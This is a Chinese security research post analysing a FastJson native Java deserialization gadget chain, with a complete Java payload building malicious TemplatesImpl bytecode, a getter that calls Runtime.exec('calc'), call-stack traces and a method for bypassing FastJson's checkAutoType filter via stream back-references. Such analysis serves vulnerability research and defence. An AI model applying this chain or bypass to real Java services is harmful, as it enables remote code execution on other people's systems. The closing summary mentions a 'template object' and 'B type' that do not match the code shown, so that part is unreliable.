# fastjson原生反序列化链分析-先知社区

> **来源**: https://xz.aliyun.com/news/17133  
> **文章ID**: 17133

---

**前言**  
FastJson原生反序列化链不同于之前分析fastjson利用链，之前利用链分析的是fastjson在解析json格式的数据时，通过构造恶意的json数据，期间会涉及到1.2.24-1.2.80等不同版本的绕过以及额外依赖。而这里的FastJson原生反序列化链是利用FasJson当中函数的调用关系，结合java原生反序列化来对目标应用进行攻击  
主要还是利用BadAttributeValueExpException对象通过它的readObject方法调用ToStringBean的toString方法，val字段的值是一个JSONArray对象，所以会调用JSONArray的toString方法。但是由于JSONArray本身并没有toString方法，这里会直接调用JSON的ToString方法  
在JSON的ToString会调用自身的toJSONString方法，而toJSONString方法能够调用任意类的getter方法，从而实现了template对象getOutputProperties方法的调用，  
**分析**  
为了更好理解反序列化调用，这里自定义类A，其中getter方法中执行代码，

```
package com.sun.test.juju;

import java.io.*;
import java.io.IOException;

public class A implements Serializable {

    private static final long serialVersionUID = 1L;

    // 类的属性，可以根据需求调整
    private String name;

    // 获取属性方法
    public String getName() throws IOException {
        Runtime.getRuntime().exec("calc");
        return name;
    }

    // 重写 readObject 方法
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {


        // 默认的反序列化过程
        in.defaultReadObject();
    }

    // 序列化方法
    public void serialize(String filename) {
        try (ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(filename))) {
            out.writeObject(this);
            System.out.println("对象已序列化到 " + filename);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // 反序列化方法
    public static A deserialize(String filename) {
        try (ObjectInputStream in = new ObjectInputStream(new FileInputStream(filename))) {
            A a = (A) in.readObject();
            System.out.println("对象已反序列化: " + a.getName());
            return a;
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

}

```

直接在A中下断点执行，payload如下：

```
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.test.juju.A;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;

public class FastJson2 {

    public static byte[] getTemplates() throws IOException, CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("Test");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec("calc");";
        ctClass.makeClassInitializer().insertBefore(block);
        return ctClass.toBytecode();
    }

    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = getTemplates();

        A a = new A();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(a);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        HashMap<Object, Object> hashMap1 = new HashMap<>();

        hashMap.put(a,badAttributeValueExpException);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(a);
        oos.writeObject(hashMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));

        try {
            Object o = ois.readObject();
        } catch (Exception e) {
        }
    }
}

```

调用栈如下：

```
getName:27, A (com.sun.test.juju)
write:-1, ASMSerializer_1_A (com.alibaba.fastjson.serializer)
write:135, ListSerializer (com.alibaba.fastjson.serializer)
write:312, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:1077, JSON (com.alibaba.fastjson)
toString:1071, JSON (com.alibaba.fastjson)
readObject:86, BadAttributeValueExpException (javax.management)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
readObject:1412, HashMap (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1170, ObjectStreamClass (java.io)
readSerialData:2178, ObjectInputStream (java.io)
readOrdinaryObject:2069, ObjectInputStream (java.io)
readObject0:1573, ObjectInputStream (java.io)
readObject:431, ObjectInputStream (java.io)
main:68, FastJson2
```

可以看到调用栈

```
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
```

展示了 Java 反序列化过程中从反射机制到实际对象读取的调用链，涉及到反射方法调用、序列化类的反序列化逻辑以及从输入流中恢复对象的过程。  
这一过程在下面有多处涉及，就不多说了

注意到栈顶的下一个栈帧调用了ASMSerializer\_1\_A.write方法，在idea中无法调试显示，为了直观展示出调用A.getName的逻辑，考虑通过工具从jvm内存中将已经生成并加载的ASMSerializer\_1字节码文件给dump下来，  
![Pasted image 20250302193301.png](images/14277b1d-fc93-3996-96b0-897ab3ebde5f)  
看到这里调用了a.getName()

按照调用关系，hashmap中，key作为任意对象应该不影响作为value的BadAttributeValueExpException反序列化调用，但是当将key设置为空时，运行发现并没有执行代码，经过反复调试，发现从BadAttributeValueExpException.readobject方法报错，这里跟进调试  
java.io.ObjectInputStream#readFields  
![Pasted image 20250302191159.png](images/44f8a31b-fdb6-3405-b2e0-aa8fd2db96dd)  
java.io.ObjectInputStream.GetFieldImpl#readFields  
![Pasted image 20250302191216.png](images/87d51489-6c09-36ff-95b6-06bb39d7e4ca)  
从上面这里读取了属性值，接着还是通过反序列化方法java.io.ObjectInputStream#readObject0递归调用  
![Pasted image 20250302225546.png](images/a3791e61-ac7c-386c-8a5b-b2e64e5227f0)  
![Pasted image 20250303170355.png](images/5476085a-43b8-3bd3-b48e-cecbbf9245db)  
![Pasted image 20250302225644.png](images/a14fe112-4ce7-3515-9076-90873ed22b24)  
从上面可以看到，因为BadAttributeValueExpException对象中val属性值为jsonArray实例，所以这里的类描述信息就是com.alibaba.fastjson.JSONArray  
接着执行到java.io.ObjectInputStream#readSerialData  
![Pasted image 20250303170617.png](images/74addf25-61a3-321d-9208-762ae089c715)  
到这里开始就是文中开头提到的Java 反序列化过程中从反射机制到实际对象读取的调用链，  
![Pasted image 20250303170651.png](images/89ec8d28-8096-3c58-b4a1-124c462d83d1)  
最后调用的是com.alibaba.fastjson.JSONArray#readObject方法  
![Pasted image 20250303171127.png](images/43bc80ab-1ef6-3ef7-a569-ec10bbf62aec)  
跟进java.io.ObjectInputStream#defaultReadObject，  
![Pasted image 20250303171522.png](images/e7bdaeef-9066-3c78-9c3f-4fcd48ce6cf2)  
内部又调用了readobject0方法  
![Pasted image 20250303171552.png](images/9d601ebb-7bfd-3b0e-9df5-18e127286d57)  
接着又进行反射读取反序列对象流程，一直到java.util.ArrayList#readObject中  
![Pasted image 20250303171752.png](images/edad4d53-a5b1-3380-b132-e4abf9ee9276)

从上面payload构造也好理解，jsonArray实例中存在arraylist对象，  
重点分析下从java.io.ObjectInputStream#readObject进入的流程，在java.io.ObjectInputStream#readObject0中，会根据读取的序列化流的字节信息去分别调用不同的方法，  
![Pasted image 20250303172157.png](images/d3ca8b41-0893-33ee-ab05-3c89bbad94ed)  
这里因为是object对象，所以进入的java.io.ObjectInputStream#readOrdinaryObject方法，这里java.io.ObjectInputStream#readClassDesc是读取类的描述符信息，跟进  
![Pasted image 20250303172743.png](images/503e11a9-6e91-3be0-8c35-8ec8f4def194)  
可以看到，它会根据不同的类型调用不同的方法，这里调用的是java.io.ObjectInputStream#readNonProxyDesc  
![Pasted image 20250303173428.png](images/0f767c73-26aa-388a-a677-9269868194e6)  
在java.io.ObjectInputStream#readNonProxyDesc中，又会调  
com.alibaba.fastjson.JSONObject.SecureObjectInputStream#resolveClass，接着通过checkAutoType去进行检查是否能够调用  
![Pasted image 20250303173706.png](images/46b780da-7f2c-3126-951c-739d7deb75d9)  
在这里导致程序无法执行下去

为了不让程序执行到这里，注意检查java.io.ObjectInputStream#readObject0方法，  
![Pasted image 20250303174712.png](images/f3e98cce-e5fe-3bc6-93da-ba36454b6235)  
发现java.io.ObjectStreamConstants#TC\_REFERENCE注释中可以看出，进入该条件的方法就是，这个对象已经被写入到序列化流中，  
![Pasted image 20250303174255.png](images/4e8fea52-2760-32b6-963e-a592e0f2f07c)  
也就是说在尝试反序列化A类前，可以将A提前写入到序列化流中，这样就会进入该方法，  
![Pasted image 20250303174802.png](images/bfc1196b-80d3-3bf0-8676-c99caca89fb2)  
从而绕过检查，  
那么这里payload就是

```
        hashMap.put(a,badAttributeValueExpException);
```

a在badAttributeValueExpException前执行，

通过对整个流程梳理，还有一点疑问就是，在a反序列化时，为什么可以通过检查，按道理说，A类也要进过checkAutoType检查报错，但实际上，作为A类（没有被JSONArray嵌套），它调用的是java.io.ObjectInputStream#resolveClass  
![Pasted image 20250303175421.png](images/c583f86e-4584-3857-9155-1c6ac6edbccb)  
而被JSONArray嵌套的类，也就是paylaod中这样的形式，

```
        A a = new A();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(a);
```

实际上是会调用com.alibaba.fastjson.JSONObject.SecureObjectInputStream#resolveClass，原因很简单，就是在调用com.alibaba.fastjson.JSONArray#readObject时，fastjson将ObjectInputStream封装成了SecureObjectInputStream，进而可以自定义检查规则。  
![Pasted image 20250303175744.png](images/85052d88-357f-35ef-a0b9-f243ced5025e)

**总结**  
首先是被嵌套在JSONArray里面的template对象，由于JSONObject#resolve()无法正常解析B类型的缘故，所以造成payload2无法正常执行，其次是前一个template对象在ObjectInputStream#resolveClass的作用下成功解析，并协助后面的JSONArray里面的template绕过了审查。
